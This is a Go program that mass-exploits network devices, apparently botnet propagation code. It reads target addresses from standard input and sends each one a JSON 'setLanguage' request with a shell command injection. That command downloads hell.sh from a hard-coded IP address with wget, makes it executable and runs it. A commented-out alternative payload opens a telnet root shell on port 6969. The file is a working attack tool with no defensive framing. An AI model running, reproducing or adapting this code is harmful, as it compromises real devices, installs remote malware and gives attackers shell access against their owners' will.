package main

import (
	"net"
	"os"
	"time"
	"fmt"
	"strings"
	"sync"
	"bufio"
	"io"
	"bytes"
	"crypto/tls"
	"strconv"
)

var (
	port = os.Args[1]
	protocol = os.Args[2]

	conf = &tls.Config{
		InsecureSkipVerify: true,
	}

	wg sync.WaitGroup

	timeout = 10 * time.Second

	processed uint64
	found uint64
	exploited uint64

	payload = ""
)

func findDevice(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "HTTP/1.1 404 Not Found")
}

func sendPayload(target string) {
	var conn net.Conn
	var err error

	if protocol == "https" {
		conn, err = tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", target, conf)
	} else {
		conn, err = net.DialTimeout("tcp", target, timeout)
	}

	if err != nil {
		return
	}

	data := "{\"method\": \"setLanguage\", \"params\": {\"payload\": \"';cd /tmp;rm -rf hell.sh;wget http://45.88.67.38/hell.sh; chmod 777 hell.sh;sh hell.sh;'\"}}"
	//data := "{\"method\": \"setLanguage\", \"params\": {\"payload\": \"';rm /tmp/f;mknod /tmp/f p;telnetd -p6969 -l /bin/sh;'\"}}"
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST / HTTP/1.1\r\nContent-Length: " + cntLen + "\r\nContent-Type: application/json\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)
}

func exploitDevice(target string) {

	processed++

	wg.Add(1)
	defer wg.Done()

	/*
	if !findDevice(target) {
		return
	}

	found++
	*/

	sendPayload(target)
}

func titleWriter() {
	for {
		fmt.Printf("Processed: %d | Found: %d | Exploited: %d\n", processed, found, exploited)
		time.Sleep(1 * time.Second)
	}
}

func main() {

	scanner := bufio.NewScanner(os.Stdin)

	go titleWriter()

	for scanner.Scan() {

		if port == "manual" {
			go exploitDevice(scanner.Text())
		} else {
			go exploitDevice(scanner.Text() + ":" + port)
		}
	}

	time.Sleep(10 * time.Second)
	wg.Wait()
}
